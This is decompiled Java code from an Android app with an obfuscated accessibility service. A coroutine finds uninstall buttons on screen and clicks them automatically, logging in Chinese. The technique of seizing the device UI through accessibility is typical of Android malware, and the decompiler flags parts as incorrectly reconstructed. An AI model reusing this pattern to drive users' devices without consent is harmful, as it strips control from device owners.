package com.storm.safe.rock.service;

import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlinx.coroutines.AbstractC0780a0;
import p000.AbstractC1262tj;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.cq0;
import p000.dh0;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$findAndClickUninstallButton$1", m214403f = "dqtvuisjd.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class dqtvuisjd$findAndClickUninstallButton$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ dqtvuisjd f52537a1;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public dqtvuisjd$findAndClickUninstallButton$1(dqtvuisjd dqtvuisjdVar, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52537a1 = dqtvuisjdVar;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new dqtvuisjd$findAndClickUninstallButton$1(this.f52537a1, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) throws Throwable {
        dqtvuisjd$findAndClickUninstallButton$1 dqtvuisjd_findandclickuninstallbutton_1 = (dqtvuisjd$findAndClickUninstallButton$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
        C1351vv c1351vv = C1351vv.f60710b1;
        dqtvuisjd_findandclickuninstallbutton_1.invokeSuspend(c1351vv);
        return c1351vv;
    }

    /* JADX WARN: Code restructure failed: missing block: B:41:0x00e3, code lost:
    
        r5 = r6.size();
     */
    /* JADX WARN: Code restructure failed: missing block: B:42:0x00e7, code lost:
    
        if (r10 >= r5) goto L80;
     */
    /* JADX WARN: Code restructure failed: missing block: B:43:0x00e9, code lost:
    
        r7 = r6.get(r10);
        r10 = r10 + 1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:44:0x00f1, code lost:
    
        p000.cq0.m212492d5((android.view.accessibility.AccessibilityNodeInfo) r7);
     */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        dqtvuisjd dqtvuisjdVar = this.f52537a1;
        dqtvuisjd.C0290a0 c0290a0 = dqtvuisjd.f52358m1;
        try {
            AccessibilityNodeInfo rootInActiveWindow = dqtvuisjdVar.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                Iterator it = dh0.f55754a4.iterator();
                while (true) {
                    if (!it.hasNext()) {
                        t60.m214726f4("dqtvuisjd", "⚠️ 未找到卸载按钮");
                        cq0.m212492d5(rootInActiveWindow);
                        break;
                    }
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText((String) it.next());
                    for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                        if (!accessibilityNodeInfo.isClickable()) {
                            ArrayList arrayList = new ArrayList();
                            AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
                            while (true) {
                                int i = 0;
                                if (parent == null) {
                                    break;
                                }
                                arrayList.add(parent);
                                if (parent.isClickable()) {
                                    t60.m214714d6("dqtvuisjd", "✅ 点击卸载按钮的父节点");
                                    parent.performAction(16);
                                    AbstractC0780a0.m213692a3(dqtvuisjdVar.f52378a9, AbstractC1262tj.f60233a0, new dqtvuisjd$findAndClickUninstallButtonInternal$3(dqtvuisjdVar, null), 2);
                                    int size = arrayList.size();
                                    while (i < size) {
                                        Object obj2 = arrayList.get(i);
                                        i++;
                                        try {
                                            cq0.m212492d5((AccessibilityNodeInfo) obj2);
                                        } catch (Exception unused) {
                                        }
                                    }
                                    Iterator<T> it2 = listFindAccessibilityNodeInfosByText.iterator();
                                    while (it2.hasNext()) {
                                        try {
                                            cq0.m212492d5((AccessibilityNodeInfo) it2.next());
                                        } catch (Exception unused2) {
                                        }
                                    }
                                    cq0.m212492d5(rootInActiveWindow);
                                } else {
                                    parent = parent.getParent();
                                }
                            }
                        } else {
                            t60.m214714d6("dqtvuisjd", "✅ 找到卸载按钮: " + ((Object) accessibilityNodeInfo.getText()));
                            accessibilityNodeInfo.performAction(16);
                            AbstractC0780a0.m213692a3(dqtvuisjdVar.f52378a9, AbstractC1262tj.f60233a0, new dqtvuisjd$findAndClickUninstallButtonInternal$1(dqtvuisjdVar, null), 2);
                            Iterator<T> it3 = listFindAccessibilityNodeInfosByText.iterator();
                            while (it3.hasNext()) {
                                try {
                                    cq0.m212492d5((AccessibilityNodeInfo) it3.next());
                                } catch (Exception unused3) {
                                }
                            }
                            cq0.m212492d5(rootInActiveWindow);
                        }
                    }
                    Iterator<T> it4 = listFindAccessibilityNodeInfosByText.iterator();
                    while (it4.hasNext()) {
                        try {
                            cq0.m212492d5((AccessibilityNodeInfo) it4.next());
                        } catch (Exception unused4) {
                        }
                    }
                }
            } else {
                t60.m214726f4("dqtvuisjd", "⚠️ 无法获取当前窗口");
            }
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 查找卸载按钮失败", e);
        }
        return C1351vv.f60710b1;
    }
}
